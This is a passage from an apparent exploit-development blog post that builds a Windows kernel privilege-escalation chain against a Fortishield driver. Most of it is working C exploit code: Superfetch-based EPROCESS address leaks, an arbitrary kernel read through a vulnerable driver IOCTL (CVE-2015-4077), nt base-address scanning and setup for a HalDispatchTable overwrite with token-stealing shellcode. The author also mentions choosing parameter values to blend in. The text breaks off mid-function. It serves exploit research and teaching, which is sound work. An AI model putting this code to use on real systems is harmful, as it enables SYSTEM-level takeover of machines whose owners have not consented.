<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dd nt!KiServiceTable + 0x04 * 0x151 L1

? 064FCD00 &gt;&gt;&gt; 4

u nt!KiServiceTable + 00000000`0064fcd0
</code></pre></div></div>

<p><img src="/assets/images/post2-windbg-syscall-1.png" alt="post2-windbg-syscall-1" /></p>

<p>We can call this function from user-mode since it is exported from ntdll.dll if we know the function prototype and its parameters. However, this is an undocumented API and Microsoft does not intended for us to directly call it, meaning they do not provide us with the function prototype or an example of how to call it. Luckily other researchers have performed the RE necessary to determine the function prototype so that we know how to call it. <a href="https://ntdoc.m417z.com/ntqueryintervalprofile">NtDoc</a> lists the prototype as:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef _NTEXAPI_H
#if (PHNT_MODE != PHNT_MODE_KERNEL)
</span>
<span class="cm">/**
 * The NtQueryIntervalProfile routine retrieves the interval for the specified profile source.
 *
 * \param ProfileSource The profile source (KPROFILE_SOURCE) to query.
 * \param Interval A pointer to a variable that receives the interval, in 100-nanosecond units.
 * \return NTSTATUS Successful or errant status.
 */</span>
<span class="n">NTSYSCALLAPI</span>
<span class="n">NTSTATUS</span>
<span class="n">NTAPI</span>
<span class="nf">NtQueryIntervalProfile</span><span class="p">(</span>
    <span class="n">_In_</span> <span class="n">KPROFILE_SOURCE</span> <span class="n">ProfileSource</span><span class="p">,</span>
    <span class="n">_Out_</span> <span class="n">PULONG</span> <span class="n">Interval</span>
    <span class="p">);</span>

<span class="cp">#endif
#endif
</span></code></pre></div></div>

<p>Connor McGarr was able to use 0x1234 for ProfileSource in his blog. I did not have any luck getting that to work in my initial testing. This was likely due to other errors in the code because it now works if I use that in my final POC. I used the value 0x2 that corresponds to ProfileTotalIssues during my troubleshooting when I finally got the code to work. I picked this value based off a recommendation from Microsoft CoPilot when troubleshooting errors as it said it was the most commonly used value.  AI can help you if used properly, but you cannot be successful in the security research or exploit development fields if you over rely on AI. My testing showed that the value 0x2 worked so I kept that value as using legitimate values blend in a bit better than random values that do not conform what a normal call looks like. The Interval parameter can simply be a pointer to a declared ULONG variable. Below is the enum of the KPROFILE_SOURCE from <a href="https://ntdoc.m417z.com/kprofile_source">NtDoc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef _NTKEAPI_H
#if (PHNT_MODE != PHNT_MODE_KERNEL)
</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_KPROFILE_SOURCE</span>
<span class="p">{</span>
    <span class="n">ProfileTime</span><span class="p">,</span>
    <span class="n">ProfileAlignmentFixup</span><span class="p">,</span>
    <span class="n">ProfileTotalIssues</span><span class="p">,</span>
    <span class="n">ProfilePipelineDry</span><span class="p">,</span>
    <span class="n">ProfileLoadInstructions</span><span class="p">,</span>
    <span class="n">ProfilePipelineFrozen</span><span class="p">,</span>
    <span class="n">ProfileBranchInstructions</span><span class="p">,</span>
    <span class="n">ProfileTotalNonissues</span><span class="p">,</span>
    <span class="n">ProfileDcacheMisses</span><span class="p">,</span>
    <span class="n">ProfileIcacheMisses</span><span class="p">,</span>
    <span class="n">ProfileCacheMisses</span><span class="p">,</span>
    <span class="n">ProfileBranchMispredictions</span><span class="p">,</span>
    <span class="n">ProfileStoreInstructions</span><span class="p">,</span>
    <span class="n">ProfileFpInstructions</span><span class="p">,</span>
    <span class="n">ProfileIntegerInstructions</span><span class="p">,</span>
    <span class="n">Profile2Issue</span><span class="p">,</span>
    <span class="n">Profile3Issue</span><span class="p">,</span>
    <span class="n">Profile4Issue</span><span class="p">,</span>
    <span class="n">ProfileSpecialInstructions</span><span class="p">,</span>
    <span class="n">ProfileTotalCycles</span><span class="p">,</span>
    <span class="n">ProfileIcacheIssues</span><span class="p">,</span>
    <span class="n">ProfileDcacheAccesses</span><span class="p">,</span>
    <span class="n">ProfileMemoryBarrierCycles</span><span class="p">,</span>
    <span class="n">ProfileLoadLinkedIssues</span><span class="p">,</span>
    <span class="n">ProfileMaximum</span>
<span class="p">}</span> <span class="n">KPROFILE_SOURCE</span><span class="p">;</span>

<span class="cp">#endif
#endif
</span></code></pre></div></div>

<p>We now have enough to start putting together a full chain exploit using the HalDispatchTable for kernel-mode code execution. The code for the executable that will result in a bugcheck is in the GitHub repo as <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/bugcheck.cpp">bugcheck.cpp</a> and listed below in chunks with explanations. You will still need the solution from the repo that includes the headers and libraries needed to compile.</p>

<p>This first chunk just includes the headers, defines some constants, imports the token stealing shellcode from token_stealing.asm to TokenStealing(). The constants are for values in the EPROCESS and ETHREAD structures to find the KTHREAD from the EPROCESS. These are hardcoded so they are not guaranteed to work on other versions of Windows since they can change. It has been tested to work on Windows 10 20H1 and 20H2. We also define the prototpye for NtQueryIntervalProfile at the end of this chunk.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"stdafx.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"ntos.h"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Shlobj.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment (lib,"psapi")
#pragma comment(lib, "ntdll_x64.lib")
#define EPROCESS_ThreadListHead_Offset 0x5e0
#define ETHREAD_ThreadListEntry_Offset 0x4e8
#define ETHREAD_Tcb_Offset             0x000
#define ETHREAD_Cid_Offset             0x478
#define CLIENTID_UniqueThread_Offset   0x8
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="kt">void</span> <span class="nf">TokenStealing</span><span class="p">();</span>

<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SUPERFETCH_INFORMATION_CLASS</span>
<span class="p">{</span>
	<span class="n">SuperfetchRetrieveTrace</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
	<span class="n">SuperfetchSystemParameters</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
	<span class="n">SuperfetchLogEvent</span> <span class="o">=</span> <span class="mh">0x3</span><span class="p">,</span>
	<span class="n">SuperfetchGenerateTrace</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span>
	<span class="n">SuperfetchPrefetch</span> <span class="o">=</span> <span class="mh">0x5</span><span class="p">,</span>
	<span class="n">SuperfetchPfnQuery</span> <span class="o">=</span> <span class="mh">0x6</span><span class="p">,</span>
	<span class="n">SuperfetchPfnSetPriority</span> <span class="o">=</span> <span class="mh">0x7</span><span class="p">,</span>
	<span class="n">SuperfetchPrivSourceQuery</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">,</span>
	<span class="n">SuperfetchSequenceNumberQuery</span> <span class="o">=</span> <span class="mh">0x9</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioPhase</span> <span class="o">=</span> <span class="mh">0xA</span><span class="p">,</span>
	<span class="n">SuperfetchWorkerPriority</span> <span class="o">=</span> <span class="mh">0xB</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioQuery</span> <span class="o">=</span> <span class="mh">0xC</span><span class="p">,</span>
	<span class="n">SuperfetchScenarioPrefetch</span> <span class="o">=</span> <span class="mh">0xD</span><span class="p">,</span>
	<span class="n">SuperfetchRobustnessControl</span> <span class="o">=</span> <span class="mh">0xE</span><span class="p">,</span>
	<span class="n">SuperfetchTimeControl</span> <span class="o">=</span> <span class="mh">0xF</span><span class="p">,</span>
	<span class="n">SuperfetchMemoryListQuery</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
	<span class="n">SuperfetchMemoryRangesQuery</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">,</span>
	<span class="n">SuperfetchTracingControl</span> <span class="o">=</span> <span class="mh">0x12</span><span class="p">,</span>
	<span class="n">SuperfetchTrimWhileAgingControl</span> <span class="o">=</span> <span class="mh">0x13</span><span class="p">,</span>
	<span class="n">SuperfetchInformationMax</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">,</span>
<span class="p">}</span> <span class="n">SUPERFETCH_INFORMATION_CLASS</span><span class="p">;</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtWriteVirtualMemory</span><span class="p">)(</span>
	<span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span>
	<span class="n">_In_</span> <span class="n">ULONG</span> <span class="n">NumberOfBytesToWrite</span><span class="p">,</span>
	<span class="n">_Out_opt_</span> <span class="n">PULONG</span> <span class="n">NumberOfBytesWritten</span>
	<span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SUPERFETCH_INFORMATION</span>
<span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Magic</span><span class="p">;</span>
	<span class="n">SUPERFETCH_INFORMATION_CLASS</span> <span class="n">InfoClass</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">Data</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
<span class="p">}</span> <span class="n">SUPERFETCH_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSUPERFETCH_INFORMATION</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_PFS_PRIVATE_PAGE_SOURCE_TYPE</span> <span class="p">{</span>
	<span class="n">PfsPrivateSourceKernel</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
	<span class="n">PfsPrivateSourceSession</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
	<span class="n">PfsPrivateSourceProcess</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
	<span class="n">PrfsPrivateSourceMax</span> <span class="o">=</span> <span class="mh">0x3</span><span class="p">,</span>
<span class="p">}</span> <span class="n">PFS_PRIVATE_PAGE_SOURCE_TYPE</span><span class="p">;</span>

<span class="cp">#pragma pack(push)
#pragma pack(4)
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PFS_PRIVATE_PAGE_SOURCE</span>
<span class="p">{</span>
	<span class="n">PFS_PRIVATE_PAGE_SOURCE_TYPE</span> <span class="n">Type</span><span class="p">;</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">DWORD</span> <span class="n">SessionId</span><span class="p">;</span>
		<span class="n">DWORD</span> <span class="n">ProcessId</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">DWORD</span> <span class="n">SpareDwords</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="n">ULONG</span> <span class="n">ImagePathHash</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">UniqueProcessHash</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PFS_PRIVATE_PAGE_SOURCE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPFS_PRIVATE_PAGE_SOURCE</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_INFO_V3</span> <span class="p">{</span>
	<span class="n">PFS_PRIVATE_PAGE_SOURCE</span> <span class="n">DbInfo</span><span class="p">;</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">ULONG_PTR</span> <span class="n">EProcess</span><span class="p">;</span>
		<span class="n">ULONG_PTR</span> <span class="n">GlobalVA</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">ULONG</span> <span class="n">WsPrivatePages</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">TotalPrivatePages</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">SessionID</span><span class="p">;</span>
	<span class="n">CHAR</span> <span class="n">ImageName</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
	<span class="n">BYTE</span> <span class="n">SpareBytes</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_INFO_V3</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_INFO_V3</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_INFO_V3PLUS</span> <span class="p">{</span>
	<span class="n">BYTE</span> <span class="n">data2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="n">DWORD</span> <span class="n">ProcessId</span><span class="p">;</span>
	<span class="n">BYTE</span> <span class="n">data3</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
	<span class="n">ULONG_PTR</span> <span class="n">EProcess</span><span class="p">;</span>
	<span class="n">BYTE</span> <span class="n">data</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_INFO_V3PLUS</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_INFO_V3PLUS</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PF_PRIVSOURCE_QUERY_REQUEST</span> <span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>

	<span class="k">union</span> <span class="p">{</span>
		<span class="kr">__declspec</span><span class="p">(</span><span class="n">align</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="k">struct</span> <span class="p">{</span>
			<span class="n">ULONG</span> <span class="n">InfoCount</span><span class="p">;</span>
			<span class="n">PF_PRIVSOURCE_INFO_V3</span> <span class="n">InfoArrayV3</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="p">}</span> <span class="n">__sv3</span><span class="p">;</span>
		<span class="kr">__declspec</span><span class="p">(</span><span class="n">align</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="k">struct</span> <span class="p">{</span>
			<span class="n">ULONG</span> <span class="n">Type</span><span class="p">;</span>
			<span class="n">ULONG</span> <span class="n">InfoCount</span><span class="p">;</span>
			<span class="n">PF_PRIVSOURCE_INFO_V3PLUS</span> <span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="p">}</span> <span class="n">__sv3plus</span><span class="p">;</span>
	<span class="p">}</span> <span class="n">__u0</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPF_PRIVSOURCE_QUERY_REQUEST</span><span class="p">;</span>

<span class="cp">#pragma pack(pop)
</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span>
	<span class="n">DWORD</span> <span class="n">junk</span><span class="p">,</span>
	<span class="n">PULONG</span> <span class="n">buffer</span>
	<span class="p">);</span>
</code></pre></div></div>

<p>This chunk defines the GetEprocessAddress() from freeide’s code for CVE-2021-31955 with my modifications mentioned earlier.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">GetEprocessAddress</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">superfetch_info_size</span><span class="p">;</span>
	<span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="o">*</span> <span class="n">pf_privsource_query_request</span><span class="p">;</span>
	<span class="n">SUPERFETCH_INFORMATION</span> <span class="n">superfetch_info</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
	<span class="n">BYTE</span> <span class="n">temp_buffer</span><span class="p">[</span><span class="mh">0x70</span><span class="p">];</span>

	<span class="n">ZeroMemory</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">));</span>

	<span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">NtCurrentTeb</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">dwBuildNumber</span> <span class="o">=</span> <span class="n">peb</span><span class="o">-&gt;</span><span class="n">OSBuildNumber</span><span class="p">;</span>

	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span> <span class="c1">// Windows 10</span>

	<span class="k">switch</span> <span class="p">(</span><span class="n">dwBuildNumber</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="mi">7600</span><span class="p">:</span>
	<span class="k">case</span> <span class="mi">7601</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mi">9200</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mi">9600</span><span class="p">:</span>
		<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">temp_buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">InfoClass</span> <span class="o">=</span> <span class="n">SuperfetchPrivSourceQuery</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Version</span> <span class="o">=</span> <span class="mi">45</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Magic</span> <span class="o">=</span> <span class="err">'</span><span class="n">kuhC</span><span class="err">'</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Data</span> <span class="o">=</span> <span class="n">temp_buffer</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">);</span>

	<span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">pf_privsource_query_request_version</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">temp_buffer</span><span class="p">;</span>

	<span class="n">status</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemSuperfetchInformation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">superfetch_info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SUPERFETCH_INFORMATION</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="n">pf_privsource_query_request</span> <span class="o">=</span> <span class="p">(</span><span class="n">PF_PRIVSOURCE_QUERY_REQUEST</span><span class="o">*</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">__u0</span><span class="p">.</span><span class="n">__sv3</span><span class="p">.</span><span class="n">InfoCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">Version</span> <span class="o">=</span> <span class="n">pf_privsource_query_request_version</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Data</span> <span class="o">=</span> <span class="n">pf_privsource_query_request</span><span class="p">;</span>
	<span class="n">superfetch_info</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">superfetch_info_size</span><span class="p">;</span>

	<span class="n">status</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemSuperfetchInformation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">superfetch_info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SUPERFETCH_INFORMATION</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">superfetch_info_size</span><span class="p">);</span>

	<span class="k">auto</span> <span class="n">sv3plus_request</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pf_privsource_query_request</span><span class="o">-&gt;</span><span class="n">__u0</span><span class="p">.</span><span class="n">__sv3plus</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">targetName</span> <span class="o">=</span> <span class="n">target</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">procName</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">procName</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">[</span><span class="mh">0x14</span><span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">targetName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="c1">//printf("%15s\t%5d\t%p\n", procName, sv3plus_request-&gt;InfoArrayV3Plus[i].ProcessId, sv3plus_request-&gt;InfoArrayV3Plus[i].EProcess);</span>
			<span class="k">return</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">EProcess</span><span class="p">;</span>
		<span class="p">}</span>


	<span class="p">}</span>

	<span class="n">LocalFree</span><span class="p">(</span><span class="n">pf_privsource_query_request</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk performs the address leak from CVE-2015-4077 via the leakQWORD() function. This function takes the address you want to read and the handle to the madre driver. It includes the modified leakNtBase() function to find the base address of nt by supplying the handle to the mdare driver and the nt address we pull from our KTHREAD. This uses Morten Schenk’s method of  reading the address at KTHREAD + 0x2a8 which contains the address to nt!EmpCheckErrataList. It then uses the modified scan back technique to locate the nt base address. The leakFortiBase() function is used to leak the base address of Fortishield. It uses the PsLoadModuleList in nt to search through the list and find the module that matches the handle for our fortishield driver.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="n">leak_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="n">ULONGLONG</span> <span class="nf">leakQWORD</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">addr</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">driver</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">memset</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a001000</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000001a000008</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000003</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000001a000028</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x70</span><span class="p">;</span>

	<span class="n">DWORD</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="mh">0x22608C</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">InputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">InputBufferLength</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">OutputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a001000</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">OutputBufferLength</span> <span class="o">=</span> <span class="mh">0x110</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">lpBytesReturned</span><span class="p">;</span>

	<span class="n">BOOL</span> <span class="n">triggerIOCTL</span><span class="p">;</span>
	<span class="n">triggerIOCTL</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">IoControlCode</span><span class="p">,</span> <span class="n">InputBuffer</span><span class="p">,</span> <span class="n">InputBufferLength</span><span class="p">,</span> <span class="n">OutputBuffer</span><span class="p">,</span> <span class="n">OutputBufferLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">triggerIOCTL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="c1">//printf("[!] Error in the SYSCALL: %d\n", GetLastError());</span>
	<span class="p">}</span>

	<span class="n">ULONGLONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">leak_buffer</span><span class="p">[</span><span class="mh">0x202</span><span class="p">];</span>
	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">leakNtBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kthread</span><span class="p">)</span>
<span class="p">{</span>

	<span class="n">ULONGLONG</span> <span class="n">ntAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">kthread</span> <span class="o">+</span> <span class="mh">0x2a8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">baseAddr</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">signature</span> <span class="o">=</span> <span class="mh">0x00905a4d</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ntAddr</span> <span class="o">-</span> <span class="mh">0x300000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">readData</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">readData</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>

		<span class="c1">//printf("%llx\n", readData);</span>
		<span class="c1">//printf("%llx\n", tmp);</span>


		<span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">signature</span><span class="p">)</span>
		<span class="p">{</span>
